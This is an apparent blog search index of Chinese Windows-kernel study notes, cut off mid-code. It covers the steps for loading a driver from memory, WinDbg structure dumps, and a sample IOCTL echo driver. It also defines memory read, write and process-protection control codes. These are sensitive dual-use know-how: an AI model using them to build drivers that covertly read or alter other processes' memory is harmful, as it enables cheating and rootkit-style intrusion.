<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Windows内核-驱动内存加载</title>
      <link href="/87f76606.html"/>
      <url>/87f76606.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>驱动内存加载</strong></p></div><span id="more"></span><h2 id="驱动内存加载"><a href="#驱动内存加载" class="headerlink" title="驱动内存加载"></a>驱动内存加载</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><blockquote><ol><li>通过<code>explore.exe</code>定位到文件</li><li>使用<code>CreateProcess</code>创建进程（CreateUserProcess）<ul><li>a. 创建进程开辟一块内存   PEB     内核下需要挂<code>C0000000</code></li><li>b. 通过文件路径载入exe</li><li>c. 拉伸PE, 解析PE头, 把对应的数据目录存放到内存相关偏移的地址</li><li>d. 修复重定位</li><li>e. IAT 导入表修复</li><li>f. 修复TLS（驱动没有）</li><li>g. 修复延迟导入表（驱动没有, 驱动存在Cookie）</li><li>h. 修复异常表</li><li>i. CALL入口点</li></ul></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Windows内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核-驱动通信</title>
      <link href="/6195666c.html"/>
      <url>/6195666c.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>驱动通信</strong></p><p>驱动通信</p></div><span id="more"></span><h2 id="驱动通信"><a href="#驱动通信" class="headerlink" title="驱动通信"></a>驱动通信</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="DRIVER-OBJECT"><a href="#DRIVER-OBJECT" class="headerlink" title="DRIVER_OBJECT"></a>DRIVER_OBJECT</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _DEVICE_OBJECT</span><br><span class="line">ntdll!_DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x000</span> Type             : Int2B                      <span class="comment">// 设备大小</span></span><br><span class="line">   +<span class="number">0x002</span> Size             : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> ReferenceCount   : Int4B</span><br><span class="line">   +<span class="number">0x008</span> DriverObject     : Ptr32 _DRIVER_OBJECT</span><br><span class="line">   +<span class="number">0x00c</span> NextDevice       : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x010</span> AttachedDevice   : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   +<span class="number">0x014</span> CurrentIrp       : Ptr32 _IRP                 <span class="comment">// 当前请求IRP</span></span><br><span class="line">   +<span class="number">0x018</span> Timer            : Ptr32 _IO_TIMER            <span class="comment">// 时钟</span></span><br><span class="line">   +<span class="number">0x01c</span> Flags            : Uint4B                     <span class="comment">// 以什么方式读写设备</span></span><br><span class="line">   +<span class="number">0x020</span> Characteristics  : Uint4B                     <span class="comment">// 设置属性</span></span><br><span class="line">   +<span class="number">0x024</span> Vpb              : Ptr32 _VPB                 <span class="comment">// 磁盘相关, 暂不涉及</span></span><br><span class="line">   +<span class="number">0x028</span> DeviceExtension  : Ptr32 Void                 <span class="comment">// 扩展</span></span><br><span class="line">   +<span class="number">0x02c</span> DeviceType       : Uint4B                     <span class="comment">// 设备类型</span></span><br><span class="line">   +<span class="number">0x030</span> StackSize        : Char                       <span class="comment">// 设备栈的大小</span></span><br><span class="line">   +<span class="number">0x034</span> Queue            : &lt;unnamed-tag&gt;              <span class="comment">// 队列</span></span><br><span class="line">   +<span class="number">0x05c</span> AlignmentRequirement : Uint4B</span><br><span class="line">   +<span class="number">0x060</span> DeviceQueue      : _KDEVICE_QUEUE</span><br><span class="line">   +<span class="number">0x074</span> Dpc              : _KDPC</span><br><span class="line">   +<span class="number">0x094</span> ActiveThreadCount : Uint4B</span><br><span class="line">   +<span class="number">0x098</span> SecurityDescriptor : Ptr32 Void</span><br><span class="line">   +<span class="number">0x09c</span> DeviceLock       : _KEVENT</span><br><span class="line">   +<span class="number">0x0ac</span> SectorSize       : Uint2B</span><br><span class="line">   +<span class="number">0x0ae</span> Spare1           : Uint2B</span><br><span class="line">   +<span class="number">0x0b0</span> DeviceObjectExtension : Ptr32 _DEVOBJ_EXTENSION</span><br><span class="line">   +<span class="number">0x0b4</span> Reserved         : Ptr32 Void</span><br></pre></td></tr></table></figure><h4 id="IRP"><a href="#IRP" class="headerlink" title="IRP"></a>IRP</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _IRP</span><br><span class="line">ntdll!_IRP</span><br><span class="line">   +<span class="number">0x000</span> Type             : Int2B</span><br><span class="line">   +<span class="number">0x002</span> Size             : Uint2B</span><br><span class="line">   +<span class="number">0x004</span> MdlAddress       : Ptr32 _MDL</span><br><span class="line">   +<span class="number">0x008</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> AssociatedIrp    : &lt;unnamed-tag&gt;</span><br><span class="line">   +<span class="number">0x010</span> ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> IoStatus         : _IO_STATUS_BLOCK</span><br><span class="line">   +<span class="number">0x020</span> RequestorMode    : Char</span><br><span class="line">   +<span class="number">0x021</span> PendingReturned  : UChar</span><br><span class="line">   +<span class="number">0x022</span> StackCount       : Char       <span class="comment">// 总大小（有多少设备）</span></span><br><span class="line">   +<span class="number">0x023</span> CurrentLocation  : Char       <span class="comment">// 当前设备栈的索引</span></span><br><span class="line">   +<span class="number">0x024</span> Cancel           : UChar</span><br><span class="line">   +<span class="number">0x025</span> CancelIrql       : UChar</span><br><span class="line">   +<span class="number">0x026</span> ApcEnvironment   : Char</span><br><span class="line">   +<span class="number">0x027</span> AllocationFlags  : UChar</span><br><span class="line">   +<span class="number">0x028</span> UserIosb         : Ptr32 _IO_STATUS_BLOCK</span><br><span class="line">   +<span class="number">0x02c</span> UserEvent        : Ptr32 _KEVENT</span><br><span class="line">   +<span class="number">0x030</span> Overlay          : &lt;unnamed-tag&gt;</span><br><span class="line">   +<span class="number">0x038</span> CancelRoutine    : Ptr32     <span class="type">void</span> </span><br><span class="line">   +<span class="number">0x03c</span> UserBuffer       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x040</span> Tail             : &lt;unnamed-tag&gt;</span><br></pre></td></tr></table></figure><h4 id="创建设备"><a href="#创建设备" class="headerlink" title="创建设备"></a>创建设备</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_  PDRIVER_OBJECT DriverObject,          <span class="comment">// 要提供的驱动对象</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_  ULONG DeviceExtensionSize,            <span class="comment">// 设备扩展, 0代表这个地方没有指向</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ PUNICODE_STRING DeviceName,        <span class="comment">// 设备名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_  DEVICE_TYPE DeviceType,               <span class="comment">// 设备类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_  ULONG DeviceCharacteristics,          <span class="comment">// 设备属性</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_  BOOLEAN Exclusive,                    <span class="comment">// 是否独占</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _Outptr_result_nullonfailure_</span></span></span><br><span class="line"><span class="params"><span class="function">    _At_(*DeviceObject,</span></span></span><br><span class="line"><span class="params"><span class="function">        __drv_allocatesMem(Mem)</span></span></span><br><span class="line"><span class="params"><span class="function">        _When_((((_In_function_class_(DRIVER_INITIALIZE))</span></span></span><br><span class="line"><span class="params"><span class="function">               ||(_In_function_class_(DRIVER_DISPATCH)))),</span></span></span><br><span class="line"><span class="params"><span class="function">             __drv_aliasesMem))</span></span></span><br><span class="line"><span class="params"><span class="function">    PDEVICE_OBJECT *DeviceObject                <span class="comment">// 创建成功后返回的驱动对象</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h4 id="自定义控制码"><a href="#自定义控制码" class="headerlink" title="自定义控制码"></a>自定义控制码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_CODE( DeviceType, Function, Method, Access ) (                 \</span></span><br><span class="line"><span class="meta">    ((DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method) \</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_KEY CTL_CODE(FILE_DEVICE_UNKNOWN, CODE_CTR_INDEX, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line">                          <span class="comment">// 虚拟设备类型       // 索引号        // 通信方式        // 访问权限</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN, CODE_CTR_INDEX+1, METHOD_BUFFERED, FILE_ANY_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN, CODE_CTR_INDEX+2, METHOD_BUFFERED, FILE_ANY_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_BASE_DLL CTL_CODE(FILE_DEVICE_UNKNOWN, CODE_CTR_INDEX+3, METHOD_BUFFERED, FILE_ANY_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SET_PROTECT_PID CTL_CODE(FILE_DEVICE_UNKNOWN, CODE_CTR_INDEX+4, METHOD_BUFFERED, FILE_ANY_ANY_ACCESS)</span></span><br></pre></td></tr></table></figure><h4 id="创建符号链接"><a href="#创建符号链接" class="headerlink" title="创建符号链接"></a>创建符号链接</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTKERNELAPI</span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">IoCreateSymbolicLink</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PUNICODE_STRING SymbolicLinkName,          <span class="comment">// 符号链接名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ PUNICODE_STRING DeviceName                 <span class="comment">// 设备名称</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><h4 id="设置驱动派发回调函数"><a href="#设置驱动派发回调函数" class="headerlink" title="设置驱动派发回调函数"></a>设置驱动派发回调函数</h4><blockquote><p><code>IRP_MJ_CREATE</code>和<code>IRP_MJ_CLOSE</code>必须设置</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建设备开启/关闭回调函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyDriverCreate</span><span class="params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span> </span>&#123;</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(DeviceObject);</span><br><span class="line">Irp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">Irp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 IOCTL 请求</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyDriverDeviceControl</span><span class="params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 当前栈</span></span><br><span class="line">PIO_STACK_LOCATION stack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(Irp);</span><br><span class="line"><span class="comment">// 自定义控制码</span></span><br><span class="line">ULONG controlCode = stack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line"></span><br><span class="line">NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">ULONG_PTR information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (controlCode) &#123;</span><br><span class="line"><span class="keyword">case</span> IOCTL_MY_CONTROL_CODE: &#123;</span><br><span class="line"><span class="comment">// 获取输入输出缓冲区（假设用 METHOD_BUFFERED 方法）</span></span><br><span class="line">PVOID inputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer;        <span class="comment">// 输入</span></span><br><span class="line">PVOID outputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer;       <span class="comment">// 输出</span></span><br><span class="line">ULONG inputBufferLength = stack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">ULONG outputBufferLength = stack-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：简单地将接收到的输入数据拷贝到输出缓冲区</span></span><br><span class="line"><span class="keyword">if</span> (inputBufferLength &gt; <span class="number">0</span> &amp;&amp; outputBufferLength &gt;= inputBufferLength) &#123;</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(outputBuffer, inputBuffer, inputBufferLength);</span><br><span class="line">information = inputBufferLength;  <span class="comment">// 返回数据的长度</span></span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;Received from user: %s\n&quot;</span>, (<span class="type">char</span>*)inputBuffer));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">status = STATUS_BUFFER_TOO_SMALL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">status = STATUS_INVALID_DEVICE_REQUEST;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Irp-&gt;IoStatus.Status = status;</span><br><span class="line">Irp-&gt;IoStatus.Information = information;</span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 设置驱动的卸载例程和设备控制例程</span></span><br><span class="line">DriverObject-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyDriverCreate;<span class="comment">// 默认派发, 允许打开</span></span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyDriverCreate;<span class="comment">// 默认派发, 允许关闭</span></span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDriverDeviceControl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="驱动完整代码"><a href="#驱动完整代码" class="headerlink" title="驱动完整代码"></a>驱动完整代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义设备名称和符号链接</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">L&quot;\\Device\\MyUniqueDevice&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYM_LINK_NAME <span class="string">L&quot;\\DosDevices\\MyUniqueDevice&quot;</span><span class="comment">// \\??\\ 等价于\\DosDevices\\， \\DosDevices\\兼容性更高</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 IOCTL 控制码</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_MY_CONTROL_CODE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建设备回调函数</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyDriverCreate</span><span class="params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span> </span>&#123;</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(DeviceObject);</span><br><span class="line">Irp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">Irp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 驱动卸载函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">UnloadDriver</span><span class="params">(PDRIVER_OBJECT DriverObject)</span> </span>&#123;</span><br><span class="line">UNICODE_STRING symLink = <span class="built_in">RTL_CONSTANT_STRING</span>(SYM_LINK_NAME);</span><br><span class="line"><span class="built_in">IoDeleteSymbolicLink</span>(&amp;symLink);  <span class="comment">// 删除符号链接</span></span><br><span class="line"><span class="built_in">IoDeleteDevice</span>(DriverObject-&gt;DeviceObject);  <span class="comment">// 删除设备对象</span></span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;-----------DriverUnloaded-----------\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 IOCTL 请求</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">MyDriverDeviceControl</span><span class="params">(PDEVICE_OBJECT DeviceObject, PIRP Irp)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 当前栈</span></span><br><span class="line">PIO_STACK_LOCATION stack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(Irp);</span><br><span class="line"><span class="comment">// 自定义控制码</span></span><br><span class="line">ULONG controlCode = stack-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line"></span><br><span class="line">NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">ULONG_PTR information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (controlCode) &#123;</span><br><span class="line"><span class="keyword">case</span> IOCTL_MY_CONTROL_CODE: &#123;</span><br><span class="line"><span class="comment">// 获取输入输出缓冲区（假设用 METHOD_BUFFERED 方法）</span></span><br><span class="line">PVOID inputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">PVOID outputBuffer = Irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">ULONG inputBufferLength = stack-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">ULONG outputBufferLength = stack-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：简单地将接收到的输入数据拷贝到输出缓冲区</span></span><br><span class="line"><span class="keyword">if</span> (inputBufferLength &gt; <span class="number">0</span> &amp;&amp; outputBufferLength &gt;= inputBufferLength) &#123;</span><br><span class="line"><span class="built_in">RtlCopyMemory</span>(outputBuffer, inputBuffer, inputBufferLength);</span><br><span class="line">information = inputBufferLength;  <span class="comment">// 返回数据的长度</span></span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;Received from user: %s\n&quot;</span>, (<span class="type">char</span>*)inputBuffer));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">status = STATUS_BUFFER_TOO_SMALL;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">status = STATUS_INVALID_DEVICE_REQUEST;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Irp-&gt;IoStatus.Status = status;</span><br><span class="line">Irp-&gt;IoStatus.Information = information;</span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 驱动入口</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span> </span>&#123;</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(RegistryPath);</span><br><span class="line">NTSTATUS status;</span><br><span class="line">PDEVICE_OBJECT deviceObject = <span class="literal">NULL</span>;</span><br><span class="line">UNICODE_STRING deviceName = <span class="built_in">RTL_CONSTANT_STRING</span>(DEVICE_NAME);</span><br><span class="line">UNICODE_STRING symLink = <span class="built_in">RTL_CONSTANT_STRING</span>(SYM_LINK_NAME);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建设备对象</span></span><br><span class="line">status = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="number">0</span>, &amp;deviceName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, FALSE, &amp;deviceObject);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;Failed to create device\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建符号链接</span></span><br><span class="line">status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;symLink, &amp;deviceName);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line"><span class="built_in">IoDeleteDevice</span>(deviceObject);</span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;Failed to create symbolic link\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置驱动的卸载例程和设备控制例程</span></span><br><span class="line">DriverObject-&gt;DriverUnload = UnloadDriver;</span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyDriverCreate;<span class="comment">// 默认派发, 允许打开</span></span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyDriverCreate;<span class="comment">// 默认派发, 允许关闭</span></span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDriverDeviceControl;</span><br><span class="line"></span><br><span class="line"><span class="built_in">KdPrint</span>((<span class="string">&quot;Driver loaded successfully\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="用户态完整代码"><a href="#用户态完整代码" class="headerlink" title="用户态完整代码"></a>用户态完整代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 11_01_R3_Communicate(3环通信).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span 